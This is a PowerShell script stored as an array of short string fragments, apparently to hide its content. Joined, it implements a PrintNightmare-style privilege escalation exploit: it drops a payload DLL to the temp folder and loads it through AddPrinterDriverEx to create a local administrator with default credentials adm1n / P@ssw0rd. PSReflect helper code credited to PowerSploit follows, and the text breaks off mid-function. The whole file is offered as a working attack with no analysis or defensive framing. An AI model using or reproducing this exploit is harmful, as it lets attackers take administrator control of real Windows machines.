$fragments = @('function Invo','ke-nimare
{
 ','   
    param',' (
        [s','tring]$Driver','Name = "Total','ly Not Malici','ous",
       ',' [string]$New','User = "",
  ','      [string',']$NewPassword',' = "",
      ','  [string]$DL','L = ""
    )
','
    if ( $DL','L -eq "" ){
 ','       $nimar','e_data = [byt','e[]](get_nima','re_dll)
     ','   $encoder =',' New-Object S','ystem.Text.Un','icodeEncoding','

        if ','( $NewUser -n','e "" ) {
    ','        $NewU','serBytes = $e','ncoder.GetByt','es($NewUser)
','            [','System.Buffer',']::BlockCopy(','$NewUserBytes',', 0, $nimare_','data, 0x32e20',', $NewUserByt','es.Length)
  ','          $ni','mare_data[0x3','2e20+$NewUser','Bytes.Length]',' = 0
        ','    $nimare_d','ata[0x32e20+$','NewUserBytes.','Length+1] = 0','
        } el','se {
        ','    Write-Hos','t "[+] using ','default new u','ser: adm1n"
 ','       }

   ','     if ( $Ne','wPassword -ne',' "" ) {
     ','       $NewPa','sswordBytes =',' $encoder.Get','Bytes($NewPas','sword)
      ','      [System','.Buffer]::Blo','ckCopy($NewPa','sswordBytes, ','0, $nimare_da','ta, 0x32c20, ','$NewPasswordB','ytes.Length)
','            $','nimare_data[0','x32c20+$NewPa','sswordBytes.L','ength] = 0
  ','          $ni','mare_data[0x3','2c20+$NewPass','wordBytes.Len','gth+1] = 0
  ','      } else ','{
           ',' Write-Host "','[+] using def','ault new pass','word: P@ssw0r','d"
        }
','
        $DLL',' = [System.IO','.Path]::GetTe','mpPath() + "n','imare.dll"
  ','      [System','.IO.File]::Wr','iteAllBytes($','DLL, $nimare_','data)
       ',' Write-Host "','[+] created p','ayload at $DL','L"
        $d','elete_me = $t','rue
    } els','e {
        W','rite-Host "[+','] using user-','supplied payl','oad at $DLL"
','        Write','-Host "[!] ig','noring NewUse','r and NewPass','word argument','s"
        $d','elete_me = $f','alse
    }

 ','   $Mod = New','-InMemoryModu','le -ModuleNam','e "A$(Get-Ran','dom)"

    $F','unctionDefini','tions = @(
  ','    (func win','spool.drv Add','PrinterDriver','Ex ([bool]) @','([string], [U','int32], [IntP','tr], [Uint32]',') -Charset Au','to -SetLastEr','ror),
      (','func winspool','.drv EnumPrin','terDrivers([b','ool]) @( [str','ing], [string','], [Uint32], ','[IntPtr], [UI','nt32], [Uint3','2].MakeByRefT','ype(), [Uint3','2].MakeByRefT','ype()) -Chars','et Auto -SetL','astError)
   ',' )

    $Type','s = $Function','Definitions |',' Add-Win32Typ','e -Module $Mo','d -Namespace ','''Mod''

    # ','Define custom',' structures f','or types crea','ted
    $DRIV','ER_INFO_2 = s','truct $Mod DR','IVER_INFO_2 @','{
        cVe','rsion = field',' 0 Uint64;
  ','      pName =',' field 1 stri','ng -MarshalAs',' @("LPTStr");','
        pEnv','ironment = fi','eld 2 string ','-MarshalAs @(','"LPTStr");
  ','      pDriver','Path = field ','3 string -Mar','shalAs @("LPT','Str");
      ','  pDataFile =',' field 4 stri','ng -MarshalAs',' @("LPTStr");','
        pCon','figFile = fie','ld 5 string -','MarshalAs @("','LPTStr");
   ',' }

    $wins','pool = $Types','[''winspool.dr','v'']
    $APD_','COPY_ALL_FILE','S = 0x0000000','4

    [Uint3','2]($cbNeeded)',' = 0
    [Uin','t32]($cReturn','ed) = 0

    ','if ( $winspoo','l::EnumPrinte','rDrivers($nul','l, "Windows x','64", 2, [IntP','tr]::Zero, 0,',' [ref]$cbNeed','ed, [ref]$cRe','turned) ){
  ','      Write-H','ost "[!] Enum','PrinterDriver','s should fail','!"
        re','turn
    }

 ','   [IntPtr]$p','Addr = [Syste','m.Runtime.Int','eropServices.','Marshal]::All','ocHGlobal([Ui','nt32]($cbNeed','ed))

    if ','( $winspool::','EnumPrinterDr','ivers($null, ','"Windows x64"',', 2, $pAddr, ','$cbNeeded, [r','ef]$cbNeeded,',' [ref]$cRetur','ned) ){
     ','   $driver = ','[System.Runti','me.InteropSer','vices.Marshal',']::PtrToStruc','ture($pAddr, ','[System.Type]','$DRIVER_INFO_','2)
    } else',' {
        Wr','ite-Host "[!]',' failed to ge','t current dri','ver list"
   ','     [System.','Runtime.Inter','opServices.Ma','rshal]::FreeH','Global($pAddr',')
        ret','urn
    }

  ','  Write-Host ','"[+] using pD','riverPath = `','"$($driver.pD','riverPath)`""','
    [System.','Runtime.Inter','opServices.Ma','rshal]::FreeH','Global($pAddr',')

    $drive','r_info = New-','Object $DRIVE','R_INFO_2
    ','$driver_info.','cVersion = 3
','    $driver_i','nfo.pConfigFi','le = $DLL
   ',' $driver_info','.pDataFile = ','$DLL
    $dri','ver_info.pDri','verPath = $dr','iver.pDriverP','ath
    $driv','er_info.pEnvi','ronment = "Wi','ndows x64"
  ','  $driver_inf','o.pName = $Dr','iverName

   ',' $pDriverInfo',' = [System.Ru','ntime.Interop','Services.Mars','hal]::AllocHG','lobal([System','.Runtime.Inte','ropServices.M','arshal]::Size','Of($driver_in','fo))
    [Sys','tem.Runtime.I','nteropService','s.Marshal]::S','tructureToPtr','($driver_info',', $pDriverInf','o, $false)

 ','   if ( $wins','pool::AddPrin','terDriverEx($','null, 2, $pDr','iverInfo, $AP','D_COPY_ALL_FI','LES -bor 0x10',' -bor 0x8000)',' ) {
        ','if ( $delete_','me ) {
      ','      Write-H','ost "[+] adde','d user $NewUs','er as local a','dministrator"','
        } el','se {
        ','    Write-Hos','t "[+] driver',' appears to h','ave been load','ed!"
        ','}
    } else ','{
        Wri','te-Error "[!]',' AddPrinterDr','iverEx failed','"
    }

    ','if ( $delete_','me ) {
      ','  Write-Host ','"[+] deleting',' payload from',' $DLL"
      ','  Remove-Item',' -Force $DLL
','    }
}


###','#############','#############','#############','#############','#
# Stolen fr','om PowerSploi','t: https://gi','thub.com/Powe','rShellMafia/P','owerSploit
##','#############','#############','#############','#############','##

#########','#############','#############','#############','########
#
# ','PSReflect cod','e for Windows',' API access
#',' Author: @mat','tifestation
#','   https://ra','w.githubuserc','ontent.com/ma','ttifestation/','PSReflect/mas','ter/PSReflect','.psm1
#
#####','#############','#############','#############','############
','
function New','-InMemoryModu','le {
<#
.SYNO','PSIS
Creates ','an in-memory ','assembly and ','module
Author',': Matthew Gra','eber (@mattif','estation)
Lic','ense: BSD 3-C','lause
Require','d Dependencie','s: None
Optio','nal Dependenc','ies: None
.DE','SCRIPTION
Whe','n defining cu','stom enums, s','tructs, and u','nmanaged func','tions, it is
','necessary to ','associate to ','an assembly m','odule. This h','elper functio','n
creates an ','in-memory mod','ule that can ','be passed to ','the ''enum'',
''','struct'', and ','Add-Win32Type',' functions.
.','PARAMETER Mod','uleName
Speci','fies the desi','red name for ','the in-memory',' assembly and',' module. If
M','oduleName is ','not provided,',' it will defa','ult to a GUID','.
.EXAMPLE
$M','odule = New-I','nMemoryModule',' -ModuleName ','Win32
#>

   ',' [Diagnostics','.CodeAnalysis','.SuppressMess','ageAttribute(','''PSUseShouldP','rocessForStat','eChangingFunc','tions'', '''')]
','    [CmdletBi','nding()]
    ','Param (
     ','   [Parameter','(Position = 0',')]
        [V','alidateNotNul','lOrEmpty()]
 ','       [Strin','g]
        $M','oduleName = [','Guid]::NewGui','d().ToString(',')
    )

    ','$AppDomain = ','[Reflection.A','ssembly].Asse','mbly.GetType(','''System.AppDo','main'').GetPro','perty(''Curren','tDomain'').Get','Value($null, ','@())
    $Loa','dedAssemblies',' = $AppDomain','.GetAssemblie','s()

    fore','ach ($Assembl','y in $LoadedA','ssemblies) {
','        if ($','Assembly.Full','Name -and ($A','ssembly.FullN','ame.Split('',''',')[0] -eq $Mod','uleName)) {
 ','           re','turn $Assembl','y
        }
 ','   }

    $Dy','nAssembly = N','ew-Object Ref','lection.Assem','blyName($Modu','leName)
    $','Domain = $App','Domain
    $A','ssemblyBuilde','r = $Domain.D','efineDynamicA','ssembly($DynA','ssembly, ''Run',''')
    $Modul','eBuilder = $A','ssemblyBuilde','r.DefineDynam','icModule($Mod','uleName, $Fal','se)

    retu','rn $ModuleBui','lder
}

# A h','elper functio','n used to red','uce typing wh','ile defining ','function
# pr','ototypes for ','Add-Win32Type','.
function fu','nc {
    Para','m (
        [','Parameter(Pos','ition = 0, Ma','ndatory = $Tr','ue)]
        ','[String]
    ','    $DllName,','

        [Pa','rameter(Posit','ion = 1, Mand','atory = $True',')]
        [s','tring]
      ','  $FunctionNa','me,

        ','[Parameter(Po','sition = 2, M','andatory = $T','rue)]
       ',' [Type]
     ','   $ReturnTyp','e,

        [','Parameter(Pos','ition = 3)]
 ','       [Type[',']]
        $P','arameterTypes',',

        [P','arameter(Posi','tion = 4)]
  ','      [Runtim','e.InteropServ','ices.CallingC','onvention]
  ','      $Native','CallingConven','tion,

      ','  [Parameter(','Position = 5)',']
        [Ru','ntime.Interop','Services.Char','Set]
        ','$Charset,

  ','      [String',']
        $En','tryPoint,

  ','      [Switch',']
        $Se','tLastError
  ','  )

    $Pro','perties = @{
','        DllNa','me = $DllName','
        Func','tionName = $F','unctionName
 ','       Return','Type = $Retur','nType
    }

','    if ($Para','meterTypes) {',' $Properties[','''ParameterTyp','es''] = $Param','eterTypes }
 ','   if ($Nativ','eCallingConve','ntion) { $Pro','perties[''Nati','veCallingConv','ention''] = $N','ativeCallingC','onvention }
 ','   if ($Chars','et) { $Proper','ties[''Charset','''] = $Charset',' }
    if ($S','etLastError) ','{ $Properties','[''SetLastErro','r''] = $SetLas','tError }
    ','if ($EntryPoi','nt) { $Proper','ties[''EntryPo','int''] = $Entr','yPoint }

   ',' New-Object P','SObject -Prop','erty $Propert','ies
}

functi','on Add-Win32T','ype
{
<#
.SYN','OPSIS
Creates',' a .NET type ','for an unmana','ged Win32 fun','ction.
Author',': Matthew Gra','eber (@mattif','estation)
Lic','ense: BSD 3-C','lause
Require','d Dependencie','s: None
Optio','nal Dependenc','ies: func
.DE','SCRIPTION
Add','-Win32Type en','ables you to ','easily intera','ct with unman','aged (i.e.
Wi','n32 unmanaged',') functions i','n PowerShell.',' After provid','ing
Add-Win32','Type with a f','unction signa','ture, a .NET ','type is creat','ed
using refl','ection (i.e. ','csc.exe is ne','ver called li','ke with Add-T','ype).
The ''fu','nc'' helper fu','nction can be',' used to redu','ce typing whe','n defining
mu','ltiple functi','on definition','s.
.PARAMETER',' DllName
The ','name of the D','LL.
.PARAMETE','R FunctionNam','e
The name of',' the target f','unction.
.PAR','AMETER EntryP','oint
The DLL ','export functi','on name. This',' argument sho','uld be specif','ied if the
sp','ecified funct','ion name is d','ifferent than',' the name of ','the exported
','function.
.PA','RAMETER Retur','nType
The ret','urn type of t','he function.
','.PARAMETER Pa','rameterTypes
','The function ','parameters.
.','PARAMETER Nat','iveCallingCon','vention
Speci','fies the nati','ve calling co','nvention of t','he function. ','Defaults to
s','tdcall.
.PARA','METER Charset','
If you need ','to explicitly',' call an ''A'' ','or ''W'' Win32 ','function, you',' can
specify ','the character',' set.
.PARAME','TER SetLastEr','ror
Indicates',' whether the ','callee calls ','the SetLastEr','ror Win32 API','
function bef','ore returning',' from the att','ributed metho','d.
.PARAMETER',' Module
The i','n-memory modu','le that will ','host the func','tions. Use
Ne','w-InMemoryMod','ule to define',' an in-memory',' module.
.PAR','AMETER Namesp','ace
An option','al namespace ','to prepend to',' the type. Ad','d-Win32Type d','efaults
to a ','namespace con','sisting only ','of the name o','f the DLL.
.E','XAMPLE
$Mod =',' New-InMemory','Module -Modul','eName Win32
$','FunctionDefin','itions = @(
 ',' (func kernel','32 GetProcAdd','ress ([IntPtr',']) @([IntPtr]',', [String]) -','Charset Ansi ','-SetLastError','),
  (func ke','rnel32 GetMod','uleHandle ([I','ntptr]) @([St','ring]) -SetLa','stError),
  (','func ntdll Rt','lGetCurrentPe','b ([IntPtr]) ','@())
)
$Types',' = $FunctionD','efinitions | ','Add-Win32Type',' -Module $Mod',' -Namespace ''','Win32''
$Kerne','l32 = $Types[','''kernel32'']
$','Ntdll = $Type','s[''ntdll'']
$N','tdll::RtlGetC','urrentPeb()
$','ntdllbase = $','Kernel32::Get','ModuleHandle(','''ntdll'')
$Ker','nel32::GetPro','cAddress($ntd','llbase, ''RtlG','etCurrentPeb''',')
.NOTES
Insp','ired by Lee H','olmes'' Invoke','-WindowsApi h','ttp://poshcod','e.org/2189
Wh','en defining m','ultiple funct','ion prototype','s, it is idea','l to provide
','Add-Win32Type',' with an arra','y of function',' signatures. ','That way, the','y
are all inc','orporated int','o the same in','-memory modul','e.
#>

    [O','utputType([Ha','shtable])]
  ','  Param(
    ','    [Paramete','r(Mandatory=$','True, ValueFr','omPipelineByP','ropertyName=$','True)]
      ','  [String]
  ','      $DllNam','e,

        [','Parameter(Man','datory=$True,',' ValueFromPip','elineByProper','tyName=$True)',']
        [St','ring]
       ',' $FunctionNam','e,

        [','Parameter(Val','ueFromPipelin','eByPropertyNa','me=$True)]
  ','      [String',']
        $En','tryPoint,

  ','      [Parame','ter(Mandatory','=$True, Value','FromPipelineB','yPropertyName','=$True)]
    ','    [Type]
  ','      $Return','Type,

      ','  [Parameter(','ValueFromPipe','lineByPropert','yName=$True)]','
        [Typ','e[]]
        ','$ParameterTyp','es,

        ','[Parameter(Va','lueFromPipeli','neByPropertyN','ame=$True)]
 ','       [Runti','me.InteropSer','vices.Calling','Convention]
 ','       $Nativ','eCallingConve','ntion = [Runt','ime.InteropSe','rvices.Callin','gConvention]:',':StdCall,

  ','      [Parame','ter(ValueFrom','PipelineByPro','pertyName=$Tr','ue)]
        ','[Runtime.Inte','ropServices.C','harSet]
     ','   $Charset =',' [Runtime.Int','eropServices.','CharSet]::Aut','o,

        [','Parameter(Val','ueFromPipelin','eByPropertyNa','me=$True)]
  ','      [Switch',']
        $Se','tLastError,

','        [Para','meter(Mandato','ry=$True)]
  ','      [Valida','teScript({($_',' -is [Reflect','ion.Emit.Modu','leBuilder]) -','or ($_ -is [R','eflection.Ass','embly])})]
  ','      $Module',',

        [V','alidateNotNul','l()]
        ','[String]
    ','    $Namespac','e = ''''
    )
','
    BEGIN
  ','  {
        $','TypeHash = @{','}
    }

    ','PROCESS
    {','
        if (','$Module -is [','Reflection.As','sembly])
    ','    {
       ','     if ($Nam','espace)
     ','       {
    ','            $','TypeHash[$Dll','Name] = $Modu','le.GetType("$','Namespace.$Dl','lName")
     ','       }
    ','        else
','            {','
            ','    $TypeHash','[$DllName] = ','$Module.GetTy','pe($DllName)
','            }','
        }
  ','      else
  ','      {
     ','       # Defi','ne one type f','or each DLL
 ','           if',' (!$TypeHash.','ContainsKey($','DllName))
   ','         {
  ','             ',' if ($Namespa','ce)
         ','       {
    ','             ','   $TypeHash[','$DllName] = $','Module.Define','Type("$Namesp','ace.$DllName"',', ''Public,Bef','oreFieldInit''',')
           ','     }
      ','          els','e
           ','     {
      ','             ',' $TypeHash[$D','llName] = $Mo','dule.DefineTy','pe($DllName, ','''Public,Befor','eFieldInit'')
','             ','   }
        ','    }

      ','      $Method',' = $TypeHash[','$DllName].Def','ineMethod(
  ','             ',' $FunctionNam','e,
          ','      ''Public',',Static,Pinvo','keImpl'',
    ','            $','ReturnType,
 ','             ','  $ParameterT','ypes)

      ','      # Make ','each ByRef pa','rameter an Ou','t parameter
 ','           $i',' = 1
        ','    foreach($','Parameter in ','$ParameterTyp','es)
         ','   {
        ','        if ($','Parameter.IsB','yRef)
       ','         {
  ','             ','     [void] $','Method.Define','Parameter($i,',' ''Out'', $null',')
           ','     }

     ','           $i','++
          ','  }

        ','    $DllImpor','t = [Runtime.','InteropServic','es.DllImportA','ttribute]
   ','         $Set','LastErrorFiel','d = $DllImpor','t.GetField(''S','etLastError'')','
            ','$CallingConve','ntionField = ','$DllImport.Ge','tField(''Calli','ngConvention''',')
           ',' $CharsetFiel','d = $DllImpor','t.GetField(''C','harSet'')
    ','        $Entr','yPointField =',' $DllImport.G','etField(''Entr','yPoint'')
    ','        if ($','SetLastError)',' { $SLEValue ','= $True } els','e { $SLEValue',' = $False }

','            i','f ($PSBoundPa','rameters[''Ent','ryPoint'']) { ','$ExportedFunc','Name = $Entry','Point } else ','{ $ExportedFu','ncName = $Fun','ctionName }

','            #',' Equivalent t','o C# version ','of [DllImport','(DllName)]
  ','          $Co','nstructor = [','Runtime.Inter','opServices.Dl','lImportAttrib','ute].GetConst','ructor([Strin','g])
         ','   $DllImport','Attribute = N','ew-Object Ref','lection.Emit.','CustomAttribu','teBuilder($Co','nstructor,
  ','             ',' $DllName, [R','eflection.Pro','pertyInfo[]] ','@(), [Object[',']] @(),
     ','           [R','eflection.Fie','ldInfo[]] @($','SetLastErrorF','ield,
       ','             ','             ','          $Ca','llingConventi','onField,
    ','             ','             ','             ','$CharsetField',',
           ','             ','             ','      $EntryP','ointField),
 ','             ','  [Object[]] ','@($SLEValue,
','             ','             ','   ([Runtime.','InteropServic','es.CallingCon','vention] $Nat','iveCallingCon','vention),
   ','             ','             ','([Runtime.Int','eropServices.','CharSet] $Cha','rset),
      ','             ','          $Ex','portedFuncNam','e))

        ','    $Method.S','etCustomAttri','bute($DllImpo','rtAttribute)
','        }
   ',' }

    END
 ','   {
        ','if ($Module -','is [Reflectio','n.Assembly])
','        {
   ','         retu','rn $TypeHash
','        }

  ','      $Return','Types = @{}

','        forea','ch ($Key in $','TypeHash.Keys',')
        {
 ','           $T','ype = $TypeHa','sh[$Key].Crea','teType()

   ','         $Ret','urnTypes[$Key','] = $Type
   ','     }

     ','   return $Re','turnTypes
   ',' }
}


functi','on psenum {
<','#
.SYNOPSIS
C','reates an in-','memory enumer','ation for use',' in your Powe','rShell sessio','n.
Author: Ma','tthew Graeber',' (@mattifesta','tion)
License',': BSD 3-Claus','e
Required De','pendencies: N','one
Optional ','Dependencies:',' None
.DESCRI','PTION
The ''ps','enum'' functio','n facilitates',' the creation',' of enums ent','irely in
memo','ry using as c','lose to a "C ','style" as Pow','erShell will ','allow.
.PARAM','ETER Module
T','he in-memory ','module that w','ill host the ','enum. Use
New','-InMemoryModu','le to define ','an in-memory ','module.
.PARA','METER FullNam','e
The fully-q','ualified name',' of the enum.','
.PARAMETER T','ype
The type ','of each enum ','element.
.PAR','AMETER EnumEl','ements
A hash','table of enum',' elements.
.P','ARAMETER Bitf','ield
Specifie','s that the en','um should be ','treated as a ','bitfield.
.EX','AMPLE
$Mod = ','New-InMemoryM','odule -Module','Name Win32
$I','mageSubsystem',' = psenum $Mo','d PE.IMAGE_SU','BSYSTEM UInt1','6 @{
    UNKN','OWN =        ','          0
 ','   NATIVE =  ','             ','    1 # Image',' doesn''t requ','ire a subsyst','em.
    WINDO','WS_GUI =     ','         2 # ','Image runs in',' the Windows ','GUI subsystem','.
    WINDOWS','_CUI =       ','       3 # Im','age runs in t','he Windows ch','aracter subsy','stem.
    OS2','_CUI =       ','           5 ','# Image runs ','in the OS/2 c','haracter subs','ystem.
    PO','SIX_CUI =    ','            7',' # Image runs',' in the Posix',' character su','bsystem.
    ','NATIVE_WINDOW','S =          ',' 8 # Image is',' a native Win','9x driver.
  ','  WINDOWS_CE_','GUI =        ','   9 # Image ','runs in the W','indows CE sub','system.
    E','FI_APPLICATIO','N =          ','10
    EFI_BO','OT_SERVICE_DR','IVER =  11
  ','  EFI_RUNTIME','_DRIVER =    ','   12
    EFI','_ROM =       ','           13','
    XBOX =  ','             ','      14
    ','WINDOWS_BOOT_','APPLICATION =',' 16
}
.NOTES
','PowerShell pu','rists may dis','agree with th','e naming of t','his function ','but
again, th','is was develo','ped in such a',' way so as to',' emulate a "C',' style"
defin','ition as clos','ely as possib','le. Sorry, I''','m not going t','o name it
New','-Enum. :P
#>
','
    [OutputT','ype([Type])]
','    Param (
 ','       [Param','eter(Position',' = 0, Mandato','ry=$True)]
  ','      [Valida','teScript({($_',' -is [Reflect','ion.Emit.Modu','leBuilder]) -','or ($_ -is [R','eflection.Ass','embly])})]
  ','      $Module',',

        [P','arameter(Posi','tion = 1, Man','datory=$True)',']
        [Va','lidateNotNull','OrEmpty()]
  ','      [String',']
        $Fu','llName,

    ','    [Paramete','r(Position = ','2, Mandatory=','$True)]
     ','   [Type]
   ','     $Type,

','        [Para','meter(Positio','n = 3, Mandat','ory=$True)]
 ','       [Valid','ateNotNullOrE','mpty()]
     ','   [Hashtable',']
        $En','umElements,

','        [Swit','ch]
        $','Bitfield
    ',')

    if ($M','odule -is [Re','flection.Asse','mbly])
    {
','        retur','n ($Module.Ge','tType($FullNa','me))
    }

 ','   $EnumType ','= $Type -as [','Type]

    $E','numBuilder = ','$Module.Defin','eEnum($FullNa','me, ''Public'',',' $EnumType)

','    if ($Bitf','ield)
    {
 ','       $Flags','Constructor =',' [FlagsAttrib','ute].GetConst','ructor(@())
 ','       $Flags','CustomAttribu','te = New-Obje','ct Reflection','.Emit.CustomA','ttributeBuild','er($FlagsCons','tructor, @())','
        $Enu','mBuilder.SetC','ustomAttribut','e($FlagsCusto','mAttribute)
 ','   }

    for','each ($Key in',' $EnumElement','s.Keys)
    {','
        # Ap','ply the speci','fied enum typ','e to each ele','ment
        ','$null = $Enum','Builder.Defin','eLiteral($Key',', $EnumElemen','ts[$Key] -as ','$EnumType)
  ','  }

    $Enu','mBuilder.Crea','teType()
}


','# A helper fu','nction used t','o reduce typi','ng while defi','ning struct
#',' fields.
func','tion field {
','    Param (
 ','       [Param','eter(Position',' = 0, Mandato','ry=$True)]
  ','      [UInt16',']
        $Po','sition,

    ','    [Paramete','r(Position = ','1, Mandatory=','$True)]
     ','   [Type]
   ','     $Type,

','        [Para','meter(Positio','n = 2)]
     ','   [UInt16]
 ','       $Offse','t,

        [','Object[]]
   ','     $Marshal','As
    )

   ',' @{
        P','osition = $Po','sition
      ','  Type = $Typ','e -as [Type]
','        Offse','t = $Offset
 ','       Marsha','lAs = $Marsha','lAs
    }
}

','
function str','uct
{
<#
.SYN','OPSIS
Creates',' an in-memory',' struct for u','se in your Po','werShell sess','ion.
Author: ','Matthew Graeb','er (@mattifes','tation)
Licen','se: BSD 3-Cla','use
Required ','Dependencies:',' None
Optiona','l Dependencie','s: field
.DES','CRIPTION
The ','''struct'' func','tion facilita','tes the creat','ion of struct','s entirely in','
memory using',' as close to ','a "C style" a','s PowerShell ','will allow. S','truct
fields ','are specified',' using a hash','table where e','ach field of ','the struct
is',' comprosed of',' the order in',' which it sho','uld be define','d, its .NET
t','ype, and opti','onally, its o','ffset and spe','cial marshali','ng attributes','.
One of the ','features of ''','struct'' is th','at after your',' struct is de','fined,
it wil','l come with a',' built-in Get','Size method a','s well as an ','explicit
conv','erter so that',' you can easi','ly cast an In','tPtr to the s','truct without','
relying upon',' calling Size','Of and/or Ptr','ToStructure i','n the Marshal','
class.
.PARA','METER Module
','The in-memory',' module that ','will host the',' struct. Use
','New-InMemoryM','odule to defi','ne an in-memo','ry module.
.P','ARAMETER Full','Name
The full','y-qualified n','ame of the st','ruct.
.PARAME','TER StructFie','lds
A hashtab','le of fields.',' Use the ''fie','ld'' helper fu','nction to eas','e
defining ea','ch field.
.PA','RAMETER Packi','ngSize
Specif','ies the memor','y alignment o','f fields.
.PA','RAMETER Expli','citLayout
Ind','icates that a','n explicit of','fset for each',' field will b','e specified.
','.EXAMPLE
$Mod',' = New-InMemo','ryModule -Mod','uleName Win32','
$ImageDosSig','nature = psen','um $Mod PE.IM','AGE_DOS_SIGNA','TURE UInt16 @','{
    DOS_SIG','NATURE =    0','x5A4D
    OS2','_SIGNATURE = ','   0x454E
   ',' OS2_SIGNATUR','E_LE = 0x454C','
    VXD_SIGN','ATURE =    0x','454C
}
$Image','DosHeader = s','truct $Mod PE','.IMAGE_DOS_HE','ADER @{
    e','_magic =    f','ield 0 $Image','DosSignature
','    e_cblp = ','    field 1 U','Int16
    e_c','p =       fie','ld 2 UInt16
 ','   e_crlc =  ','   field 3 UI','nt16
    e_cp','arhdr =  fiel','d 4 UInt16
  ','  e_minalloc ','= field 5 UIn','t16
    e_max','alloc = field',' 6 UInt16
   ',' e_ss =      ',' field 7 UInt','16
    e_sp =','       field ','8 UInt16
    ','e_csum =     ','field 9 UInt1','6
    e_ip = ','      field 1','0 UInt16
    ','e_cs =       ','field 11 UInt','16
    e_lfar','lc =   field ','12 UInt16
   ',' e_ovno =    ',' field 13 UIn','t16
    e_res',' =      field',' 14 UInt16[] ','-MarshalAs @(','''ByValArray'',',' 4)
    e_oem','id =    field',' 15 UInt16
  ','  e_oeminfo =','  field 16 UI','nt16
    e_re','s2 =     fiel','d 17 UInt16[]',' -MarshalAs @','(''ByValArray''',', 10)
    e_l','fanew =   fie','ld 18 Int32
}','
# Example of',' using an exp','licit layout ','in order to c','reate a union','.
$TestUnion ','= struct $Mod',' TestUnion @{','
    field1 =',' field 0 UInt','32 0
    fiel','d2 = field 1 ','IntPtr 0
} -E','xplicitLayout','
.NOTES
Power','Shell purists',' may disagree',' with the nam','ing of this f','unction but
a','gain, this wa','s developed i','n such a way ','so as to emul','ate a "C styl','e"
definition',' as closely a','s possible. S','orry, I''m not',' going to nam','e it
New-Stru','ct. :P
#>

  ','  [OutputType','([Type])]
   ',' Param (
    ','    [Paramete','r(Position = ','1, Mandatory=','$True)]
     ','   [ValidateS','cript({($_ -i','s [Reflection','.Emit.ModuleB','uilder]) -or ','($_ -is [Refl','ection.Assemb','ly])})]
     ','   $Module,

','        [Para','meter(Positio','n = 2, Mandat','ory=$True)]
 ','       [Valid','ateNotNullOrE','mpty()]
     ','   [String]
 ','       $FullN','ame,

       ',' [Parameter(P','osition = 3, ','Mandatory=$Tr','ue)]
        ','[ValidateNotN','ullOrEmpty()]','
        [Has','htable]
     ','   $StructFie','lds,

       ',' [Reflection.','Emit.PackingS','ize]
        ','$PackingSize ','= [Reflection','.Emit.Packing','Size]::Unspec','ified,

     ','   [Switch]
 ','       $Expli','citLayout
   ',' )

    if ($','Module -is [R','eflection.Ass','embly])
    {','
        retu','rn ($Module.G','etType($FullN','ame))
    }

','    [Reflecti','on.TypeAttrib','utes] $Struct','Attributes = ','''AnsiClass,
 ','       Class,','
        Publ','ic,
        S','ealed,
      ','  BeforeField','Init''

    if',' ($ExplicitLa','yout)
    {
 ','       $Struc','tAttributes =',' $StructAttri','butes -bor [R','eflection.Typ','eAttributes]:',':ExplicitLayo','ut
    }
    ','else
    {
  ','      $Struct','Attributes = ','$StructAttrib','utes -bor [Re','flection.Type','Attributes]::','SequentialLay','out
    }

  ','  $StructBuil','der = $Module','.DefineType($','FullName, $St','ructAttribute','s, [ValueType','], $PackingSi','ze)
    $Cons','tructorInfo =',' [Runtime.Int','eropServices.','MarshalAsAttr','ibute].GetCon','structors()[0',']
    $SizeCo','nst = @([Runt','ime.InteropSe','rvices.Marsha','lAsAttribute]','.GetField(''Si','zeConst''))

 ','   $Fields = ','New-Object Ha','shtable[]($St','ructFields.Co','unt)

    # S','ort each fiel','d according t','o the orders ','specified
   ',' # Unfortunat','ely, PSv2 doe','sn''t have the',' luxury of th','e
    # hasht','able [Ordered','] accelerator','.
    foreach',' ($Field in $','StructFields.','Keys)
    {
 ','       $Index',' = $StructFie','lds[$Field][''','Position'']
  ','      $Fields','[$Index] = @{','FieldName = $','Field; Proper','ties = $Struc','tFields[$Fiel','d]}
    }

  ','  foreach ($F','ield in $Fiel','ds)
    {
   ','     $FieldNa','me = $Field[''','FieldName'']
 ','       $Field','Prop = $Field','[''Properties''',']

        $O','ffset = $Fiel','dProp[''Offset',''']
        $T','ype = $FieldP','rop[''Type'']
 ','       $Marsh','alAs = $Field','Prop[''Marshal','As'']

       ',' $NewField = ','$StructBuilde','r.DefineField','($FieldName, ','$Type, ''Publi','c'')

        ','if ($MarshalA','s)
        {
','            $','UnmanagedType',' = $MarshalAs','[0] -as ([Run','time.InteropS','ervices.Unman','agedType])
  ','          if ','($MarshalAs[1','])
          ','  {
         ','       $Size ','= $MarshalAs[','1]
          ','      $Attrib','Builder = New','-Object Refle','ction.Emit.Cu','stomAttribute','Builder($Cons','tructorInfo,
','             ','       $Unman','agedType, $Si','zeConst, @($S','ize))
       ','     }
      ','      else
  ','          {
 ','             ','  $AttribBuil','der = New-Obj','ect Reflectio','n.Emit.Custom','AttributeBuil','der($Construc','torInfo, [Obj','ect[]] @($Unm','anagedType))
','            }','

           ',' $NewField.Se','tCustomAttrib','ute($AttribBu','ilder)
      ','  }

        ','if ($Explicit','Layout) { $Ne','wField.SetOff','set($Offset) ','}
    }

    ','# Make the st','ruct aware of',' its own size','.
    # No mo','re having to ','call [Runtime','.InteropServi','ces.Marshal]:',':SizeOf!
    ','$SizeMethod =',' $StructBuild','er.DefineMeth','od(''GetSize'',','
        ''Pub','lic, Static'',','
        [Int','],
        [T','ype[]] @())
 ','   $ILGenerat','or = $SizeMet','hod.GetILGene','rator()
    #',' Thanks for t','he help, Jaso','n Shirk!
    ','$ILGenerator.','Emit([Reflect','ion.Emit.OpCo','des]::Ldtoken',', $StructBuil','der)
    $ILG','enerator.Emit','([Reflection.','Emit.OpCodes]','::Call,
     ','   [Type].Get','Method(''GetTy','peFromHandle''','))
    $ILGen','erator.Emit([','Reflection.Em','it.OpCodes]::','Call,
       ',' [Runtime.Int','eropServices.','Marshal].GetM','ethod(''SizeOf',''', [Type[]] @','([Type])))
  ','  $ILGenerato','r.Emit([Refle','ction.Emit.Op','Codes]::Ret)
','
    # Allow ','for explicit ','casting from ','an IntPtr
   ',' # No more ha','ving to call ','[Runtime.Inte','ropServices.M','arshal]::PtrT','oStructure!
 ','   $ImplicitC','onverter = $S','tructBuilder.','DefineMethod(','''op_Implicit''',',
        ''Pr','ivateScope, P','ublic, Static',', HideBySig, ','SpecialName'',','
        $Str','uctBuilder,
 ','       [Type[',']] @([IntPtr]','))
    $ILGen','erator2 = $Im','plicitConvert','er.GetILGener','ator()
    $I','LGenerator2.E','mit([Reflecti','on.Emit.OpCod','es]::Nop)
